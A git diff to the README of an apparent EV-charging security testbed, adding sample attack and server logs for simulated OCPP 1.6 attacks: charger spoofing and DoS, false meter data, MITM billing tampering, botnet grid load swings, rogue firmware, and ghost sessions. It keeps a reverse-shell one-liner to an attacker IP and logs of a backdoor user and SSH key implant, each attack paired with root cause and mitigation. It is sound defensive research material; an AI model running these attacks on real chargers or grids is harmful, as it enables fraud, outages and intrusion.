@@ -275,6 +275,41 @@ python attacks/attack_saiflow_dos_patched.py --cp-id CP_2 --duration 30
 python attacks/attack_saiflow_dos_patched.py --interval 0.1
 ```
 
+**Expected output — attack terminal:**
+```
+============================================================
+  EVSecSim — SaiFlow DoS Attack
+============================================================
+  Target CSMS   : ws://127.0.0.1:9000
+  Spoofed CP ID : CP_1
+  Flood interval: 1.0 ms  (1000 HB/s)
+  Duration      : unlimited
+============================================================
+
+[ATK 14:02:31.415] Phase 1 — Opening rogue WebSocket to ws://127.0.0.1:9000
+[ATK 14:02:31.423] Phase 1 — Sending raw CP ID: 'CP_1'
+[OK  14:02:31.431] Phase 1 — CSMS accepted connection for 'CP_1'
+[ATK 14:02:31.447] Sending rogue BootNotification as 'CP_1'
+[ATK 14:02:31.447]   Vendor : RogueVendor
+[ATK 14:02:31.447]   Model  : RogueCP-v1.0
+[OK  14:02:31.462] CSMS accepted rogue BootNotification — shadow session active
+[ATK 14:02:31.463] Starting Heartbeat flood (interval=1.0 ms)
+[ATK 14:02:31.463] Legitimate EVSE MeterValues should now stop appearing in CSMS output
+
+[ATK 14:02:36.471] Flood stats — sent: 4,921  errors: 0  rate: 984 HB/s  elapsed: 5.0s
+[ATK 14:02:41.479] Flood stats — sent: 9,887  errors: 0  rate: 989 HB/s  elapsed: 10.1s
+```
+
+**Expected output — CSMS terminal (key evidence: duplicate CP_1 connections accepted):**
+```
+[CSMS] Connected: CP_1
+[CSMS] BootNotification from: CP_1 (LegitVendor / EVSE-v2.0)
+[CSMS] CP_1 | Power = 60.0 kW
+[CSMS] Connected: CP_1                       ← second connection accepted, no dedup
+[CSMS] BootNotification from: CP_1 (RogueVendor / RogueCP-v1.0)
+[CSMS] CP_1 | Power = 60.0 kW               ← legitimate EVSE still printing (session shadowing)
+```
+
 **Root cause:** No CP authentication; no connection registry in OCPP 1.6.  
 **Mitigation:** OCPP 2.0.1 with mutual TLS; CSMS-side duplicate-session rejection.
 
@@ -297,6 +332,39 @@ A compromised EVSE fabricates MeterValues readings. The CSMS trusts all reported
 ```bash
 python attacks/attack_fdi.py
 CSMS_URL=ws://127.0.0.1:9000 python attacks/attack_fdi.py
+```
+
+**Expected output — attack terminal:**
+```
+Connecting to CSMS at ws://127.0.0.1:9000 as 'CP_1' ...
+[14:05:10] Registered with CSMS — status: accepted
+
+PHASE 1 — NORMAL REPORTING (15s)
+[14:05:10] NORMAL  | real=  60.0 kW | reported=  60.0 kW | ✓
+[14:05:12] NORMAL  | real=   0.0 kW | reported=   0.0 kW | ✓
+[14:05:14] NORMAL  | real=  60.0 kW | reported=  60.0 kW | ✓
+
+PHASE 2 — UNDER-REPORTING (15s)
+Charger draws 60.0 kW. Reporting 0.0 kW to CSMS.
+[14:05:25] UNDER   | real=  60.0 kW | reported=   0.0 kW | HIDING 60 kW from operator
+[14:05:27] UNDER   | real=  60.0 kW | reported=   0.0 kW | HIDING 60 kW from operator
+
+PHASE 3 — OVER-REPORTING (15s)
+Charger is idle. Reporting 999.0 kW to CSMS.
+[14:05:40] OVER    | real=   0.0 kW | reported= 999.0 kW | FAKING 999 kW phantom load
+[14:05:42] OVER    | real=   0.0 kW | reported= 999.0 kW | FAKING 999 kW phantom load
+```
+
+**Expected output — CSMS terminal (key evidence: gap between attack and CSMS values):**
+```
+[CSMS] Connected: CP_1
+[CSMS] BootNotification from: CP_1 (Compromised-Vendor / FDI-Demo-v1)
+[CSMS] CP_1 | Power = 60.0 kW     ← Phase 1: matches attack terminal (accurate)
+[CSMS] CP_1 | Power = 0.0 kW
+[CSMS] CP_1 | Power = 0.0 kW      ← Phase 2: CSMS sees 0 while charger draws 60 kW
+[CSMS] CP_1 | Power = 0.0 kW
+[CSMS] CP_1 | Power = 999.0 kW    ← Phase 3: CSMS sees 999 kW on idle charger
+[CSMS] CP_1 | Power = 999.0 kW
 ```
 
 **Root cause:** MeterValues are unsigned and unverified in OCPP 1.6.  
@@ -325,6 +393,48 @@ python attacks/attack_mitm_session_patched.py --tamper-delay 5 --inject-delay 15
 python core/evse_client4_fixed.py --url ws://127.0.0.1:9001
 ```
 
+**Expected output — proxy terminal:**
+```
+  Proxy listening on  : ws://0.0.0.0:9001
+  Forwarding to CSMS  : ws://127.0.0.1:9000
+  Tamper phase starts : T+10s after EVSE connects
+  Injection at        : T+20s after EVSE connects
+  Tampered power value: 999.0 kW
+
+[PRX 14:10:01.200] EVSE connected to proxy — opening upstream connection to CSMS
+[PRX 14:10:01.215] CP identity captured: 'CP_1' — relaying to CSMS
+[ATK 14:10:01.216] MITM SESSION ACTIVE for CP: 'CP_1'
+[E→C 14:10:01.220] [BootNotification] uid=a1b2c3d4 → forwarding
+[E→C 14:10:03.401] [MeterValues] uid=e5f6g7h8 → forwarding       ← Phase 1: transparent
+
+[TAM 14:10:11.220] PHASE 2 ACTIVE — MeterValues TAMPERING
+[TAM 14:10:11.224] TAMPERED #1: real=34.52 kW → csms sees=999.0 kW
+[TAM 14:10:13.401] TAMPERED #2: real=41.18 kW → csms sees=999.0 kW
+
+[ATK 14:10:21.220] PHASE 3 — INJECTING FORGED StopTransaction
+[ATK 14:10:21.220]   uid       : mitm-stop-1718812221
+[ATK 14:10:21.220]   meterStop : 0 Wh  (billing corrupted)
+[ATK 14:10:21.220]   reason    : Remote
+[ATK 14:10:21.220] EVSE keeps charging. CSMS closes session.
+[ATK 14:10:21.235] StopTransaction frame delivered to CSMS
+```
+
+**Expected output — CSMS terminal (key evidence: session closed while EVSE never stopped):**
+```
+[CSMS] Connected: CP_1
+[CSMS] BootNotification from: CP_1 (EV-Vendor / EVSE-2.0)
+[CSMS] CP_1 | Power = 34.52 kW    ← Phase 1: real values pass through
+[CSMS] CP_1 | Power = 999.0 kW    ← Phase 2: tampered — real value was ~41 kW
+[CSMS] CP_1 | Power = 999.0 kW
+
+[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[CSMS]  STOPTRANSACTION received from : CP_1
+[CSMS]  transaction_id : 1
+[CSMS]  meter_stop     : 0 Wh
+[CSMS]  --> SESSION TERMINATED — billing closed at 0 Wh   ← injected, EVSE still charging
+[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+```
+
 **Root cause:** Plaintext WebSocket (ws://); no message integrity.  
 **Mitigation:** TLS (wss://); mutual TLS certificate authentication; OCPP 2.0.1 per-message signing.
 
@@ -346,6 +456,8 @@ python attacks/attack_mitm_ext.py --csms-url ws://127.0.0.1:9000
 python attacks/attack_mitm_ext.py --tamper-delay 5 --inject-delay 15
 python core/evse_client4_fixed.py --url ws://127.0.0.1:9002
 ```
+
+**Expected output** is identical in structure to Attack 3a above, with the proxy listening on port 9002 instead of 9001. The key distinction visible in logs and pcap is the source IP: the proxy originates from `172.20.0.30` (public-net), not from the operator LAN.
 
 **Key distinction from 3a:** The attacker is on `public-net` only. This models real-world scenarios where EVSEs connect to cloud CSMS platforms over 4G/LTE, and the attacker intercepts the WAN path rather than the local LAN.
 
@@ -373,6 +485,66 @@ A botnet of compromised EVSEs connects to the CSMS and executes coordinated load
 python attacks/attack_load_altering.py --bots 10
 python attacks/attack_load_altering.py --bots 50    # 10% of 500-station fleet
 python attacks/attack_load_altering.py --bots 500   # full fleet takeover
+```
+
+**Expected output — attack terminal (10-bot run):**
+```
+  CSMS            : ws://127.0.0.1:9000
+  Bot fleet size  : 10 chargers
+  Fleet coverage  : 2% of 500-station grid twin
+  Simulated load  : 2.2 MW botnet / 110 MW total EV
+
+[GRD 14:15:03] Building pandapower grid twin (a6breakers topology)...
+[GRD 14:15:05] Grid twin ready: 500 EV chargers, 1510 MW total load
+
+[BOT 14:15:05] Connecting 10 bots to CSMS...
+  Connected: 10/10
+[OK  14:15:06] 10 bots connected and registered with CSMS
+
+  [14:15:06] Tick  1 — all bots → 220.0 kW (normal)
+
+[GRD 14:15:26] Power flow result — Baseline (all normal)
+[GRD 14:15:26]   EV load        :   110.0 MW  (nominal: 110 MW)
+[GRD 14:15:26]   22kV vm_pu     :  0.9456 pu  (RISE ▲ from nominal 0.9456)
+[GRD 14:15:26]   Trafo loading  :  22.0%
+[GRD 14:15:26]   Est. Δf        : +0.0000 Hz
+
+  [14:15:26] Tick  1 — SURGE all 10 bots → 220.0 kW  [coordinated max load]
+
+[GRD 14:15:46] Power flow result — Coordinated surge (all max)
+[GRD 14:15:46]   22kV vm_pu     :  0.9408 pu  (SAG ▼ from nominal 0.9456)
+[GRD 14:15:46]   Trafo loading  :  22.0%
+
+  [14:15:46] Tick  1 — DROP  all 10 bots →   0.0 kW  [coordinated zero load]
+
+[GRD 14:16:06] Power flow result — Coordinated drop (all zero)
+[GRD 14:16:06]   22kV vm_pu     :  0.9462 pu  (RISE ▲ from nominal 0.9456)
+[GRD 14:16:06]   Est. Δf        : -0.0001 Hz
+
+  [14:16:06] Tick  1 — MAX ▲  all 10 bots → 220.0 kW
+  [14:16:11] Tick  2 — ZERO ▼ all 10 bots →   0.0 kW
+
+  Mode                                  EV MW    22kV pu    Trafo %
+  --------------------------------- -------- ---------- ----------
+  Baseline (all normal)               110.0     0.9456      22.0%    OK
+  Coordinated surge (all max)         110.0     0.9408      22.0%  ▼ SAG
+  Coordinated drop (all zero)         107.8     0.9462      21.6%  ▲ RISE
+  Oscillating (mid-cycle)             110.0     0.9456      22.0%    OK
+```
+
+**Expected output — CSMS terminal (10 bots registering, then load flood):**
+```
+[CSMS] Connected: BOT_001
+[CSMS] BootNotification from: BOT_001 (BotFleet-Vendor / BotCP-220kW)
+[CSMS] Connected: BOT_002
+...
+[CSMS] Connected: BOT_010
+[CSMS] BOT_001 | Power = 220.0 kW
+[CSMS] BOT_002 | Power = 220.0 kW
+[CSMS] BOT_003 | Power = 220.0 kW       ← coordinated surge: all bots simultaneously
+...
+[CSMS] BOT_001 | Power = 0.0 kW
+[CSMS] BOT_002 | Power = 0.0 kW         ← coordinated drop: all bots simultaneously
 ```
 
 **Root cause:** No per-CP rate limiting; no operator-signed charging profiles.  
@@ -410,6 +582,44 @@ nohup bash -i >& /dev/tcp/172.19.0.30/4444 0>&1 &
 python attacks/attack_firmware.py
 python attacks/attack_firmware.py --push-delay 5
 python attacks/attack_firmware.py --firmware-host atk-firmware --push-delay 10
+```
+
+**Expected output — rogue CSMS terminal:**
+```
+  Rogue CSMS    : ws://0.0.0.0:9000
+  Payload URL   : http://127.0.0.1:8080/firmware.sh
+  Push delay    : 10s after EVSE boot
+
+[14:20:01] [HTTP-PAYLOAD] Serving malicious firmware at http://0.0.0.0:8080/firmware.sh
+[14:20:01] [ROGUE-CSMS] Listening on ws://0.0.0.0:9000
+
+[14:20:05] [ROGUE-CSMS] EVSE connected: CP_1
+[14:20:05] [ROGUE-CSMS] BootNotification from CP_1 (EV-Vendor / EVSE-2.0)
+[14:20:05] [ROGUE-CSMS] Accepted — EVSE cannot distinguish this from the real CSMS
+[14:20:05] [ROGUE-CSMS] Waiting 10s before pushing malicious firmware ...
+[14:20:07] [ROGUE-CSMS] MeterValues from CP_1: 34.5 kW
+
+[14:20:15] [ROGUE-CSMS] === PHASE 2 — FIRMWARE PUSH ===
+[14:20:15] [ROGUE-CSMS] Sending UpdateFirmware to EVSE
+[14:20:15] [ROGUE-CSMS]   location     : http://127.0.0.1:8080/firmware.sh
+[14:20:15] [ROGUE-CSMS]   retrieve_date: 2024-06-19T14:20:16+00:00
+[14:20:15] [ROGUE-CSMS] OCPP 1.6 carries no firmware signature
+
+[14:20:16] [HTTP-PAYLOAD] Malicious firmware delivered to 127.0.0.1
+
+[14:20:16] [ROGUE-CSMS] FirmwareStatusNotification: downloading
+[14:20:17] [ROGUE-CSMS] FirmwareStatusNotification: downloaded
+[14:20:17] [ROGUE-CSMS] EVSE downloaded payload — zero integrity checks performed
+[14:20:18] [ROGUE-CSMS] FirmwareStatusNotification: installing
+[14:20:18] [ROGUE-CSMS] EVSE is executing payload — backdoor being installed
+[14:20:19] [ROGUE-CSMS] FirmwareStatusNotification: installed
+
+[14:20:19] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[14:20:19]   PAYLOAD INSTALLED — EVSE FULLY COMPROMISED
+[14:20:19]   Backdoor user 'backdoor' created (sudo)
+[14:20:19]   SSH key implanted in /root/.ssh/authorized_keys
+[14:20:19]   Reverse shell: 172.19.0.30:4444
+[14:20:19] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 ```
 
 **Root cause:** `UpdateFirmware` in OCPP 1.6 has no signature field; EVSE has no way to verify CSMS identity (no mutual TLS).  
@@ -450,6 +660,59 @@ python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 2
 
 # Longer ghost phase for PGTwin integration demo
 python attacks/attack_duration_spoof.py --ghost-duration 120 --meter-interval 5
+```
+
+**Expected output — proxy terminal:**
+```
+  Proxy listening on : ws://0.0.0.0:9003
+  Forwarding to CSMS : ws://127.0.0.1:9000
+  Ghost duration     : 60s after real disconnect
+  Meter interval     : 10s (synthetic MeterValues)
+
+[PRX 14:25:01.100] EVSE connected — opening upstream CSMS connection
+[PRX 14:25:01.117] CP identity: 'CP_1' → relaying to CSMS
+[ATK 14:25:01.118] DURATION SPOOF PROXY ACTIVE — CP: 'CP_1'
+[ATK 14:25:01.118] Waiting for StopTransaction to intercept...
+
+[E→C 14:25:01.122] [BootNotification] uid=a1b2c3d4 → forwarding
+[C→E 14:25:01.137] [StartTransaction ACK] transactionId=1 captured
+[E→C 14:25:03.210] [MeterValues] uid=b3c4d5e6 → forwarding       ← Phase 1: transparent
+
+[ATK 14:25:21.500] PHASE 2 — StopTransaction INTERCEPTED AND DROPPED
+[ATK 14:25:21.500]   EVSE 'CP_1' → NOT forwarded to CSMS
+[ATK 14:25:21.500]   transactionId : 1
+[ATK 14:25:21.500]   meterStop     : 180000 Wh  (real final reading)
+[ATK 14:25:21.500]   Forging ACK → EVSE disconnects cleanly, CSMS never learns
+[ATK 14:25:21.512] Forged StopTransaction ACK sent to EVSE
+
+[GHO 14:25:21.515] PHASE 3 — GHOST SESSION ACTIVE
+[GHO 14:25:21.515]   EVSE 'CP_1' physically gone — CSMS sees active session
+[GHO 14:25:21.515]   Ghost duration : 60s  (MeterValues every 10s)
+[GHO 14:25:21.515]   Phantom power  : 60.0 kW = 0.1667 kWh/interval
+[GHO 14:25:31.516] Phantom MeterValues #1: 180167 Wh  (+167 Wh phantom energy)
+[GHO 14:25:41.517] Phantom MeterValues #2: 180334 Wh  (+167 Wh phantom energy)
+[GHO 14:26:21.521] Phantom MeterValues #6: 181002 Wh  (+167 Wh phantom energy)
+
+[GHO 14:26:21.522] Ghost ended — 0.1002 kWh phantom energy injected
+[GHO 14:26:21.535] Final StopTransaction: meterStop=181002 Wh (includes phantom energy)
+```
+
+**Expected output — CSMS terminal (key evidence: 60 kW load persists after EVSE is gone):**
+```
+[CSMS] Connected: CP_1
+[CSMS] CP_1 | StartTransaction: connectorId=1 idTag=EV001 meterStart=0 Wh → txId=1
+[CSMS] CP_1 | Power = 34.52 kW    ← real EVSE charging
+[CSMS] CP_1 | Power = 41.18 kW
+[CSMS] CP_1 | Power = 60.0 kW     ← ghost session begins here (EVSE already disconnected)
+[CSMS] CP_1 | Power = 60.0 kW
+[CSMS] CP_1 | Power = 60.0 kW     ← phantom load reported for 60s after physical disconnect
+
+[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[CSMS]  STOPTRANSACTION received from : CP_1
+[CSMS]  transaction_id : 1
+[CSMS]  meter_stop     : 181002 Wh     ← inflated by ghost energy
+[CSMS]  --> SESSION TERMINATED — billing closed at 181002 Wh
+[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 ```
 
 **Root cause:** `StopTransaction` is unsigned and unverified; CSMS has no independent disconnect detection; OCPP 1.6 has no session-liveness timeout tied to physical charger state.  
